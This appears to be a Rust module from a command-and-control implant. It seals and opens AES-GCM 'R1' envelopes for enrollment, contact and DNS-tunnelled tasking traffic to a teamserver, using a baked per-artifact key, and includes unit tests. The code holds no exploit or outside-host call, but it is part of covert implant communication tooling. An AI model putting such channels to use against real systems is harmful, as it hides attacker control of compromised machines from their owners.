use aes_gcm::aead::{Aead, KeyInit, Payload};
use aes_gcm::Aes256Gcm;
use base64::Engine;
use rand::RngCore;

// The sealed-body shapes (the teamserver's AesGcmEnvelope contract,
// extending/implants.md): base64 of
// b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16), AES-256-GCM under
// the per-artifact key with a purpose tag binding each direction.

pub const ENROLL_AAD: &str = "rod-envelope-v1";
pub const CONTACT_REQUEST_AAD: &str = "rod-contact-v1";
pub const CONTACT_RESPONSE_AAD: &str = "rod-contact-response-v1";
/// The socket family's enroll exchange rides its own purpose tags (the same
/// key, a different binding): the frame grammar carries the web route's JSON
/// body, so one exchange's ciphertext must not replay as the other's.
pub const SOCKET_ENROLL_REQUEST_AAD: &str = "rod-enroll-v1";
pub const SOCKET_ENROLL_RESPONSE_AAD: &str = "rod-enroll-response-v1";
/// The DNS carriage's purpose tags: one per direction the datagram wire
/// carries, so no purpose's ciphertext reflects down the resolver chain as
/// another's.
pub const DNS_POLL_AAD: &str = "rod-dns-poll-v1";
pub const DNS_RESULT_AAD: &str = "rod-dns-result-v1";
pub const DNS_CHANNEL_AAD: &str = "rod-dns-channel-v1";
pub const DNS_STAGED_AAD: &str = "rod-dns-staged-v1";

/// The baked envelope key split into its halves: standard base64 of
/// keyId(16) || key(32); None when absent or malformed -- a bad bake falls
/// back to the plaintext frame rather than contacting undecodably.
pub fn parse_baked_key(baked: &str) -> Option<([u8; 16], [u8; 32])> {
    if baked.is_empty() {
        return None;
    }
    let packed = base64::engine::general_purpose::STANDARD
        .decode(baked.trim())
        .ok()?;
    if packed.len() != 16 + 32 {
        return None;
    }
    let mut key_id = [0u8; 16];
    key_id.copy_from_slice(&packed[..16]);
    let mut key = [0u8; 32];
    key.copy_from_slice(&packed[16..]);
    Some((key_id, key))
}

fn seal_body(plaintext: &[u8], key_id: &[u8; 16], key: &[u8; 32], aad: &str) -> Vec<u8> {
    let mut nonce = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce);
    let cipher = Aes256Gcm::new_from_slice(key).expect("32-byte key");
    let sealed = cipher
        .encrypt(
            &nonce.into(),
            Payload {
                msg: plaintext,
                aad: aad.as_bytes(),
            },
        )
        .expect("aes-gcm encrypt");
    let mut body = Vec::with_capacity(2 + 16 + 12 + sealed.len());
    body.extend_from_slice(b"R1");
    body.extend_from_slice(key_id);
    body.extend_from_slice(&nonce);
    body.extend_from_slice(&sealed);
    body
}

/// The sealed contact wire shape: the R1 body base64-encoded as text, the
/// body an opaque string rather than structured binary.
pub fn seal_contact_body(
    plaintext: &[u8],
    key_id: &[u8; 16],
    key: &[u8; 32],
    aad: &str,
) -> Vec<u8> {
    base64::engine::general_purpose::STANDARD
        .encode(seal_body(plaintext, key_id, key, aad))
        .into_bytes()
}

/// The raw R1 body (no base64): the DNS carriage's TXT payloads and
/// upstream chunks carry the sealed shape as raw bytes inside their base32
/// labels.
pub fn seal_raw_body(plaintext: &[u8], key_id: &[u8; 16], key: &[u8; 32], aad: &str) -> Vec<u8> {
    seal_body(plaintext, key_id, key, aad)
}

/// Opens what [`seal_raw_body`] sealed.
pub fn try_open_raw_body(
    body: &[u8],
    key_id: &[u8; 16],
    key: &[u8; 32],
    aad: &str,
) -> Option<Vec<u8>> {
    try_open_body(body, key_id, key, aad)
}

/// Opens what [`seal_contact_body`] sealed: None on any mismatch (wrong key,
/// tampered bytes, foreign shape) -- the caller drops the whole cycle rather
/// than acting on a partial read.
pub fn try_open_contact_body(
    body: &[u8],
    key_id: &[u8; 16],
    key: &[u8; 32],
    aad: &str,
) -> Option<Vec<u8>> {
    let text = std::str::from_utf8(body).ok()?;
    let packed = base64::engine::general_purpose::STANDARD
        .decode(text.trim())
        .ok()?;
    try_open_body(&packed, key_id, key, aad)
}

fn try_open_body(body: &[u8], key_id: &[u8; 16], key: &[u8; 32], aad: &str) -> Option<Vec<u8>> {
    if body.len() < 2 + 16 + 12 + 16 {
        return None;
    }
    if &body[..2] != b"R1" || &body[2..18] != key_id {
        return None;
    }
    let nonce = &body[18..30];
    let sealed = &body[30..];
    let cipher = Aes256Gcm::new_from_slice(key).expect("32-byte key");
    cipher
        .decrypt(
            nonce.into(),
            Payload {
                msg: sealed,
                aad: aad.as_bytes(),
            },
        )
        .ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn baked_key() -> ([u8; 16], [u8; 32]) {
        ([0x11; 16], [0x22; 32])
    }

    fn pack_key(key_id: &[u8; 16], key: &[u8; 32]) -> String {
        let mut packed = Vec::with_capacity(48);
        packed.extend_from_slice(key_id);
        packed.extend_from_slice(key);
        base64::engine::general_purpose::STANDARD.encode(packed)
    }

    #[test]
    fn baked_keys_round_trip_the_packed_shape() {
        let (key_id, key) = baked_key();
        let parsed = parse_baked_key(&pack_key(&key_id, &key)).expect("the packed shape parses");
        assert_eq!(parsed, (key_id, key));
        // Whitespace around the bake is tolerated; the wrong sizes are not.
        assert!(parse_baked_key(&format!(" {} ", pack_key(&key_id, &key))).is_some());
        assert_eq!(parse_baked_key(""), None);
        assert_eq!(parse_baked_key("!!!"), None);
        let short = base64::engine::general_purpose::STANDARD.encode([0u8; 16]);
        assert_eq!(parse_baked_key(&short), None);
    }

    #[test]
    fn raw_bodies_round_trip_under_their_purpose_tag() {
        let (key_id, key) = baked_key();
        let body = seal_raw_body(b"tasking", &key_id, &key, DNS_POLL_AAD);
        assert_eq!(&body[..2], b"R1");
        assert_eq!(
            try_open_raw_body(&body, &key_id, &key, DNS_POLL_AAD),
            Some(b"tasking".to_vec())
        );
    }

    #[test]
    fn raw_bodies_refuse_foreign_material() {
        let (key_id, key) = baked_key();
        let body = seal_raw_body(b"tasking", &key_id, &key, DNS_POLL_AAD);
        // A different purpose tag, key, or key id, a tampered byte, and a
        // truncated body each refuse the whole read.
        assert_eq!(
            try_open_raw_body(&body, &key_id, &key, DNS_RESULT_AAD),
            None
        );
        let mut wrong_key = key;
        wrong_key[0] ^= 1;
        assert_eq!(
            try_open_raw_body(&body, &key_id, &wrong_key, DNS_POLL_AAD),
            None
        );
        let mut wrong_id = key_id;
        wrong_id[0] ^= 1;
        assert_eq!(
            try_open_raw_body(&body, &wrong_id, &key, DNS_POLL_AAD),
            None
        );
        let mut tampered = body.clone();
        let last = tampered.len() - 1;
        tampered[last] ^= 1;
        assert_eq!(
            try_open_raw_body(&tampered, &key_id, &key, DNS_POLL_AAD),
            None
        );
        assert_eq!(
            try_open_raw_body(&body[..body.len() - 8], &key_id, &key, DNS_POLL_AAD),
            None
        );
    }

    #[test]
    fn contact_bodies_ride_as_text_and_never_as_raw() {
        let (key_id, key) = baked_key();
        let text = seal_contact_body(b"contact", &key_id, &key, CONTACT_REQUEST_AAD);
        assert!(
            std::str::from_utf8(&text).is_ok(),
            "the contact body is base64 text"
        );
        assert_eq!(
            try_open_contact_body(&text, &key_id, &key, CONTACT_REQUEST_AAD),
            Some(b"contact".to_vec())
        );
        // The text and raw shapes must not cross: the base64 body opened as
        // an R1 body is a mismatch on its face.
        assert_eq!(
            try_open_raw_body(&text, &key_id, &key, CONTACT_REQUEST_AAD),
            None
        );
    }

    #[test]
    fn every_seal_mints_a_fresh_nonce() {
        let (key_id, key) = baked_key();
        let first = seal_raw_body(b"same", &key_id, &key, DNS_POLL_AAD);
        let second = seal_raw_body(b"same", &key_id, &key, DNS_POLL_AAD);
        assert_ne!(first, second);
    }
}
